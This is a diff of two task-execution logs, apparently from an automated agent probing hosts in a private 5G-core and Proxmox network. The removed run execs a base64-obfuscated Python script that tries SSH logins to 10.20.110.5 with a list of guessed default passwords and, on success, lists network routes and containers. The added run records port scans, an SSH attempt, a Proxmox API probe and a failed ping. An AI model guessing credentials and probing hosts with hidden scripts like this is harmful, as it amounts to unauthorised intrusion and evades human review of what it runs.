@@ -1,10 +1,25 @@
-=== TASK EXECUTION [2026-11-02 14:19:49] ===
+=== TASK EXECUTION [2026-11-02 14:20:28] ===
 Exit code: 0
 
---- STDERR ---
-Traceback (most recent call last):
-  File "<string>", line 1, in <module>
-    import base64; exec(base64.b64decode('CmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBwYXJhbWlrbwoKcHJpbnQoIj09PSBDSEVDSyBST1VURVIgMTAuMjAuMTEwLjEgUkVBQ0hBQklMSVRZID09PSIpCnBfZ3cgPSBzdWJwcm9jZXNzLnJ1bihbJ3BpbmcnLCAnLWMnLCAnMicsICctVycsICcyJywgJzEwLjIwLjExMC4xJ10sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSkKcHJpbnQoIlJvdXRlciAxMC4yMC4xMTAuMSBQaW5nOiIsICJPSyIgaWYgcF9ndy5yZXR1cm5jb2RlID09IDAgZWxzZSAiRkFJTCIpCgpwcmludCgiXG49PT0gQ09OTkVDVCBUTyA1RyBDT1JFIFZNICgxMC4yMC4xMTAuNSkgVklBIFNTSCA9PT0iKQojIFRyeSBTU0ggZnJvbSAxMC4yMC4xMTAuNyB0byAxMC4yMC4xMTAuNQpjbGllbnRfdm0gPSBwYXJhbWlrby5TU0hDbGllbnQoKQpjbGllbnRfdm0uc2V0X21pc3NpbmdfaG9zdF9rZXlfcG9saWN5KHBhcmFtaWtvLkF1dG9BZGRQb2xpY3koKSkKCmNvbm5lY3RlZCA9IEZhbHNlCmZvciB1LCBwIGluIFsoJ3Jvb3QnLCAnQWJzb2x1dDEuJyksICgncm9vdCcsICdyb290JyksICgnaDNjJywgJ2gzYycpLCAoJ2FkbWluJywgJ2FkbWluJyldOgogICAgdHJ5OgogICAgICAgIGNsaWVudF92bS5jb25uZWN0KCcxMC4yMC4xMTAuNScsIHBvcnQ9MjIsIHVzZXJuYW1lPXUsIHBhc3N3b3JkPXAsIHRpbWVvdXQ9NCkKICAgICAgICBwcmludChmIlsrXSBTdWNjZXNzZnVsbHkgbG9nZ2VkIGludG8gMTAuMjAuMTEwLjUgd2l0aCB1c2VyICd7dX0nISIpCiAgICAgICAgXywgc3Rkb3V0LCBfID0gY2xpZW50X3ZtLmV4ZWNfY29tbWFuZCgnaXAgYWRkcjsgaXAgcm91dGU7IGRvY2tlciBwcyAyPi9kZXYvbnVsbCB8fCBwb2RtYW4gcHMgMj4vZGV2L251bGwnKQogICAgICAgIHByaW50KHN0ZG91dC5yZWFkKCkuZGVjb2RlKCd1dGYtOCcsIGVycm9ycz0ncmVwbGFjZScpKQogICAgICAgIGNsaWVudF92bS5jbG9zZSgpCiAgICAgICAgY29ubmVjdGVkID0gVHJ1ZQogICAgICAgIGJyZWFrCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwoKaWYgbm90IGNvbm5lY3RlZDoKICAgIHByaW50KCJbLV0gU1NIIHRvIDEwLjIwLjExMC41IHdpdGggc3RhbmRhcmQgY3JlZGVudGlhbHMgdGltZWQgb3V0IG9yIGZhaWxlZC4iKQo=').decode('utf-8'))
-                   ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "<string>", line 3, in <module>
-ModuleNotFoundError: No module named 'paramiko'
+--- STDOUT ---
+=== 1. TEST SSH PORT 22 ON 10.20.110.5 ===
+Connection to 10.20.110.5 22 port [tcp/ssh] succeeded!
+Port 22 OPEN on 10.20.110.5
+
+=== 2. SSH KEYS OR ATTEMPT SSH WITH PASSWORDS TO 10.20.110.5 ===
+Host key verification failed.
+
+=== 3. CHECK PROXMOX API / PORT 8006 ON 10.20.110.4 ===
+HTTP/1.1 501 method 'HEAD' not available
+Cache-Control: max-age=0
+Connection: close
+Date: Mon, 02 Nov 2026 13:20:26 GMT
+Pragma: no-cache
+
+=== 4. CHECK 10.20.111.30 PORTS (PING / TCP) ===
+PING 10.20.111.30 (10.20.111.30) 56(84) bytes of data.
+
+--- 10.20.111.30 ping statistics ---
+2 packets transmitted, 0 received, 100% packet loss, time 1009ms
+
+10.20.111.30 not reachable on port 22
